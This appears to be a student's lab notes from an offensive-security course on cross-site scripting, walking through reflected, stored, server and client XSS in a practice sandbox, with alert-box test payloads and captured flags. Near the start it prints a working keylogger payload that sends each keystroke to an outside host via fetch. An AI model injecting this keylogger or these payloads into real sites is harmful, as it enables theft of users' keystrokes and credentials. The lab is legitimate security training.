
#### Javascript Basics for Offensive uses
When a browser processes an HTTP response containing HTML, the browser creates a _Document Object Model_ (DOM) tree and renders it. The DOM includes all forms, inputs, images, etc. on a page. JavaScript can access and modify the page's DOM, resulting in a more interactive experience for end users. From a vulnerability exploitation perspective, this also means that if we can inject JavaScript, we can access and modify the page's DOM. With access to the DOM, we can redirect login forms, extract passwords, phish users, and much more.


```js
function logKey(event){
	fetch("http://192.168.45.215/k?key=" + event.key);
}

document.addEventListener('keydown', logKey);
```

Entered the payload @ `http://xss-sandbox/challenge/eval` - simulated keystrokes - hit render 
![[Pasted image 20240720234440.png]]
In my `python3 -m http.server 80`  the keystrokes are sent
`I Like to send flags, yes i do! OS{typetypetype}` is what it says
![[Pasted image 20240720234642.png]]

---------
#### XSS - Discovery
Cross-site scripting can be classified into two main types: reflected and stored. The main difference being that stored is persistent and reflected is not. A reflected XSS payload is only exploited via a crafted link or a targeted redirect from another site. Conversely, a stored XSS, as the name implies, saves the payload into the database. This means multiple victims can fall prey to a stored XSS exploit through general navigation around the site, which makes stored XSS much more dangerous. The _stored_ and _reflected_ classifications refer to the level of persistence of the payload.

In addition, stored and reflected XSS can also be classified either by server XSS or client XSS. This refers to the location in the application architecture that the payload is outputted. With server XSS, the application server is appending the untrusted user input to the HTML document without any output encoding. With client XSS, the non-malicious client-side JavaScript is appending untrusted user input to the DOM without any further encoding. This is important because client XSS is much harder to discover. While server XSS can be discovered by sending a request and reviewing the response, client XSS must be discovered by using a browser or auditing the front-end JavaScript code.

**Historically, XSS has been broken down into three categories: stored, reflected, and DOM-based. The term "DOM-based" is what we now call "client XSS". The three categories paint an inaccurate picture of the XSS landscape. Using these three categories, a student would naturally assume that an XSS vulnerability can be either stored, reflected, or DOM-based. This is not true. A vulnerability can be either stored server XSS, stored client XSS, reflected server XSS, or reflected client XSS. XSS terminology has been neglected for years and this has caused much confusion in the industry.**



----------
#### Reflected Server XSS

*What you are looking for:*

- `GET` requests
- Able to inject `HTML` with payload such as `<h1>offsec</h1>` & able to identify it when inspecting the page + `CTRL+F` to search for the injected payload - can also use `<script>alert(0)</script>`
- In `BURPSUITE` if we send a request to the server and our payload is included in the response, we know that this is a `reflected server XSS`. 


If we send a request to the server and our payload is shown in the response we know that it is Reflected Server XSS

Reflected server XSS is often found in locations where user input is sent via GET parameters. To exploit it, we would typically send a link to a user with the payload. Since the user trusts the domain, they'll click the link, the server will append our payload, and the user's browser will execute the payload. Unlike email phishing campaigns, we don't have to worry about making the domain "look" realistic since the user should already trust the domain being sent.

It's possible for POST parameters to also result in reflected XSS. However, we wouldn't be able to phish a user via a link. Instead, we would have to phish the user to a site we control and have a form auto-post when a user visits. Although, the likelihood of all of this aligning is much slimmer than a site being vulnerable via GET parameters. For this reason, we'll be focusing on reflected XSS vulnerabilities via GET parameters.

Navigate to `http://xss-sandbox/challenge/search` - ensure that /etc/hosts is change to correct IP
![[Pasted image 20240729134850.png]]
type in `offsec` and hit search
![[Pasted image 20240729135046.png]]
This search engine isn't very useful. In addition to the search term being added to the _s_ parameter, we notice that it was also appended to the search page HTML. Let's inspect this in the DOM to understand how it was appended to the document. We'll select the search term, right click, and click _Inspect Element_.

Once Inspecting use `CTRL-F` and search for the term `offsec` 
![[Pasted image 20240729135555.png]]
Before hitting enter
![[Pasted image 20240729135910.png]]
After hitting enter - the translation means that it was rendered
![[Pasted image 20240729135953.png]]
When we searched for a term with HTML, the HTML was rendered instead of escaped! This most likely means that we'll be able to inject JavaScript as well. Let's try this. We will use the standard _alert()_ function to validate the proof-of-concept works. The payload we'll be submitting is: `<script>alert(0)</script>`, which should display an alert box when rendered.
![[Pasted image 20240729140213.png]]
After hitting Ok
![[Pasted image 20240729140241.png]]
```java
search.php?s=%3Cscript%3Ealert%280%29%3C%2Fscript%3E
```

Next, let's click _Render_ on the XSS Sandbox to have the victim render the page as well. The URL above is the same URL that the victim will be visiting. Normally, this would be sent through an email, chat message, or a link on another site.
![[Pasted image 20240729140451.png]]
When the target user renders the page, we find an alert box is displayed. This means we've successfully injected a XSS payload to our target.

Now, let's exploit this in Burp Suite to confirm the server is appending the payload. If we send a request to the server and our payload is included in the response, we know that this is a reflected server XSS. We'll begin by starting Burp Suite and visiting the Proxy tab.


Opened up Burpsuite browser and browsed to `http://xss-sandbox/challenge/search`
Sent the payload `<script>alert(0)</script>`
![[Pasted image 20240729175142.png]]
Hit `OK` and it got translated to `html`
![[Pasted image 20240729175233.png]]
If we click on the _Response_ tab, we can indeed find that our payload was reflected directly in the content.
![[Pasted image 20240729175505.png]]

--------

#### Stored Server XSS

- Same payload for reflected to test `<script>alert(0)</script>`
- The difference is that the `HTML` is saved in the server, therefore when the server is accessed by someone else they see the `ALERT` pop up on their side - essentially being hardcoded
- This is the example in my notes that we have to change `TEXT` field on the web page inspect forms.

Unlike reflected XSS, stored XSS does not require us to send a specially-crafted link. Instead, any user that visits the vulnerable page, rendering the stored XSS, will execute the payload.



Unlike reflected XSS, stored XSS does not require us to send a specially-crafted link. Instead, any user that visits the vulnerable page, rendering the stored XSS, will execute the payload. Because of this, we don't have to worry about limiting our payload to GET requests. For this example, we'll use the _Blog_ application found on the XSS Sandbox. During most of this section, we'll use Firefox to discover the vulnerability and build the payload.
![[Pasted image 20240729181334.png]]
At the bottom of the page, we find that the application allows us to post a comment. Let's post a comment and check how the application responds.
utilized `bugs` as the username and `Indeed!` as the comment
![[Pasted image 20240729181647.png]]
Inspecting the page and `ctrl f` to search for `bugs`

![[Pasted image 20240729181804.png]]
We find that the name and comment were added. Let's try to inject an H1 tag into the comment and review the output. If the HTML is rendered, then we can move on and try to inject JavaScript. We'll set the same username, "bugs", but set the comment to `<h1>Hello</h1>`.
![[Pasted image 20240729181955.png]]
Instead of getting a big "hello", the HTML tag was not rendered. Let's inspect the element to understand what's going on. We'll select the comment, right click, and click "Inspect Element".
![[Pasted image 20240729182127.png]]
Strange. We seem to be showing HTML tags. Why isn't this rendering? To find the answer, let's right-click on the element and click _Edit as HTML_.
![[Pasted image 20240729182222.png]]

![[Pasted image 20240729182333.png]]\
The server seems to have encoded the HTML characters. Instead of "<", the server changed it to "&lt" to ensure that the browser would not treat the user input as HTML. Unfortunately, this most likely means this parameter is not vulnerable. Let's not give up just yet though. Let's try the username parameter. We'll visit /reset in our hacker browser to clean the database first. This isn't mandatory, but will ensure we have a clean work surface.

![[Pasted image 20240729182719.png]]
We'll use the same payload for the username `<h1>Hello</h1>`.
![[Pasted image 20240729182902.png]]
When the comment is submitted, we should find that the H1 HTML tag we injected is rendered!
![[Pasted image 20240729183001.png]]

Now that we know we can inject HTML, let's attempt to inject JavaScript. We'll use the _alert()_ function as the JavaScript to execute since it will give us a clear indicator that the XSS was executed. Again, we'll reset the database. Once reset, we'll use `<script>alert(0)</script>` as the payload. However, since the HTML will be rendered as the username, it will be very clear to the administrator which comment contains the exploit. Instead, we'll attempt to be a bit sneakier by prepending the name "John" to the payload. This way, the username field won't be empty once everything is rendered.

![[Pasted image 20240729183404.png]]
`John<script>alert(0)</script>`
![[Pasted image 20240729183542.png]]
When we submit the payload, we execute the injected XSS directly in our browser first so an alert box with "0" is displayed. Once we close the alert, we can render the payload in the target user browser by clicking _Render_ in the control panel.
![[Pasted image 20240729183643.png]]
Interestingly, we find that no specially crafted link is required to exploit the vulnerability. Any user visiting this page will receive an alert box.
![[Pasted image 20240729183745.png]]
Looking at the Burpsuite Response request i am able to see the changes of the script and `hello` comment
![[Pasted image 20240729200706.png]]

-------
#### Reflected Client XSS

- Where `innerHTML` was identified in the `browser` network information.
- `<h1>Jason</h1>` is the payload we utilized in the training

While the impact for client XSS is mostly the same as server XSS, the discovery and payload may differ. Since the payload is appended on the client-side rather than the server-side, there is a layer of abstraction that we have to handle. Unlike server XSS, we cannot discover client XSS by reviewing the requests and response. Instead, we need to have a browser render the page fully to discover if the payload worked.


The main concept in `Reflected Client XSS` is that  you can visibly see the `html` 

Before render
![[Pasted image 20240729210106.png]]
After render
![[Pasted image 20240729213121.png]]

------

#### Stored Client XSS

- Probably the easiest to exploit, the payloads are just saved to the client and if any client thatis accessing the web browser browses to the directory that an `HTML` alert was entered they will just be automatically exploited.


Unlike reflected client XSS, stored client XSS does not require an attacker to send a specially-crafted URL to a victim. Instead, any user that visits the vulnerable page will automatically be exploited. We'll again use the Survey application in the XSS Sandbox with Firefox to test this. Let's use the application as intended and submit the survey as the default user, Jason.


`<h1>Sarajevo<h1>` payload test
![[Pasted image 20240731140132.png]]
testing payload `<script>alert(0)</script>` - worked
![[Pasted image 20240731140618.png]]
client side because its requesting input from the user
![[Pasted image 20240731141621.png]]
The yellow is where the script was uploaded, notice it is empty
`OS{ExExEsss}`
![[Pasted image 20240731141738.png]]